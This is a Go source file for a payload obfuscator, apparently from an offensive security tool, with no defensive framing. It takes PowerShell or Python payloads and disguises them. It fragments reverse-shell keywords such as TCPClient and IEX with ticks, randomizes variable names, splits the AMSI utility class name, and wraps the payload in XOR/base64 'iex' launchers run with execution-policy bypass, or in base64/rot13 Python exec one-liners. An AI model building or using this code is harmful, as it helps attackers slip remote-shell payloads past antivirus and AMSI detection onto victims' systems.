package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
)

func Obfuscate(payload string, level int, pType string) string {
	if level <= 0 {
		return payload
	}

	pType = strings.ToLower(pType)
	if strings.Contains(pType, "powershell") || strings.Contains(pType, "ps") {
		return obfuscatePowerShell(payload, level)
	}
	if strings.Contains(pType, "python") {
		return obfuscatePython(payload, level)
	}

	return payload
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func obfuscatePowerShell(payload string, level int) string {
	switch level {
	case 1:
		payload = psTickFragmentation(payload)
	case 2:
		payload = psTickFragmentation(payload)
		payload = psVarRandomize(payload)
		payload = psStringSplitting(payload)
	case 3:
		payload = psTickFragmentation(payload)
		payload = psVarRandomize(payload)
		payload = psStringSplitting(payload)
		payload = psXorEncode(payload)
	}
	return payload
}

func psTickFragmentation(payload string) string {
	keywords := []string{
		"New-Object", "Net.Sockets.TCPClient", "GetStream",
		"IEX", "Invoke-Expression", "ASCIIEncoding",
		"System.Text", "System.Net", "FromBase64",
	}
	for _, k := range keywords {
		tick := ""
		for _, char := range k {
			tick += string(char) + "'"
		}
		tick = strings.TrimSuffix(tick, "'")
		payload = strings.ReplaceAll(payload, k, tick)
	}
	return payload
}

func psVarRandomize(payload string) string {
	vars := []string{"$c", "$s", "$b", "$i", "$d", "$sb", "$t", "$x", "$e", "$w"}
	for _, v := range vars {
		payload = strings.ReplaceAll(payload, v, "$"+randomString(10))
	}
	return payload
}

func psStringSplitting(payload string) string {
	targets := []struct {
		old string
		key string
	}{
		{"System.Net.Sockets.TCPClient", "TCPClient"},
		{"System.Text.ASCIIEncoding", "ASCIIEncoding"},
		{"Net.WebClient", "WebClient"},
		{"System.Management.Automation.AmsiUtils", "AmsiUtils"},
	}
	for _, t := range targets {
		if strings.Contains(payload, t.old) {
			half := len(t.old) / 2
			part1 := t.old[:half]
			part2 := t.old[half:]
			replacement := fmt.Sprintf("('%s'+'%s')", part1, part2)
			payload = strings.ReplaceAll(payload, t.old, replacement)
		}
	}
	return payload
}

func psXorEncode(payload string) string {
	key := randomString(4)
	xored := make([]byte, len(payload))
	for i := 0; i < len(payload); i++ {
		xored[i] = payload[i] ^ key[i%len(key)]
	}
	b64 := base64.StdEncoding.EncodeToString(xored)

	decoder := fmt.Sprintf(
		`powershell -NoP -NonI -Exec Bypass -Command "$k='%s';$b=[System.Convert]::FromBase64String('%s');$d='';for($i=0;$i -lt $b.Length;$i++){$d+=[char]($b[$i] -bxor $k[$i%%%d])};iex $d"`,
		key, b64, len(key),
	)
	return decoder
}

func obfuscatePython(payload string, level int) string {
	switch level {
	case 1:
		return pythonB64(payload)
	case 2:
		payload = pythonB64(payload)
		return pythonVarObfuscate(payload)
	case 3:
		b64 := base64.StdEncoding.EncodeToString([]byte(payload))
		return fmt.Sprintf(
			`python3 -c "exec(__import__('base64').b64decode(__import__('codecs').decode('%s','rot13')))"`,
			rot13(b64),
		)
	}
	return payload
}

func pythonB64(payload string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("python3 -c \"import base64;exec(base64.b64decode('%s'))\"", b64)
}

func pythonVarObfuscate(payload string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(payload))
	v := randomString(6)
	return fmt.Sprintf(
		`python3 -c "import base64;%s=base64.b64decode;exec(%s('%s'))"`,
		v, v, b64,
	)
}

func rot13(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z':
			result[i] = 'a' + (c-'a'+13)%26
		case c >= 'A' && c <= 'Z':
			result[i] = 'A' + (c-'A'+13)%26
		default:
			result[i] = c
		}
	}
	return string(result)
}
